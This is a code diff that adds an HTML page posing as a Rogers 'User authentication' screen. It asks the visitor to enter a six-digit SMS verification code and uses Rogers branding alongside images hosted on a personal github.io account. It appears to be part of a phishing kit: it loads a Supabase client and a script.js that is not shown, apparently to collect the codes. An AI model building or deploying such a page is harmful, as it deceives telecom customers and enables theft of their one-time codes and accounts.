@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/x-icon" href="https://www.rogers.com/app/prod/assets/i/favicon.ico" />
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="./script.js" type="module"></script>
+    <title>Rogers User authentication</title>
+  </head>
+  <body>
+    <div class="wrapper otp-page--wrapper d-none">
+      <header>
+        <div class="logo">
+          <img src="https://lordajanaku.github.io/hosted-asset/rogers-yahoo.png" alt="" />
+        </div>
+      </header>
+
+      <main>
+        <div class="d-flex gap-xs align-items-ctr">
+          <img src="https://lordajanaku.github.io/hosted-asset/verifySms.png" alt="" />
+          <span class="fw-600 fs-24">Check your SMS!</span>
+        </div>
+        <p class="fs-20 mg-top-xs">
+          Enter the 6-digit verification code we just sent to
+          <span class="fw-700 fs-24">+1 *** *** ****</span>
+        </p>
+        <form action="" class="mg-top-xs">
+          <div class="otp-wrapper">
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+            <input id="input-numeric" class="input--numeric fs-24" type="text" inputmode="numeric" maxlength="1" />
+          </div>
+
+          <p class="mg-top-xs opt-label">Didn't receive the code?</p>
+
+          <p class="otp-countdown-wrapper mg-top-s" style="font-size: 0.85rem; color: var(--gray-clr-200)">
+            <span>Resend Code</span>
+            <span class="otp-countdown"></span>
+          </p>
+
+          <button id="redirect" class="btn mg-top-s"><span>Continue</span></button>
+        </form>
+      </main>
+    </div>
+
+    <div class="page-animation">
+      <div class="loader-wrapper">
+        <img src="https://lordajanaku.github.io/hosted-asset/rds-progress-spinner.gif" alt="" />
+      </div>
+    </div>
+  </body>
+</html>
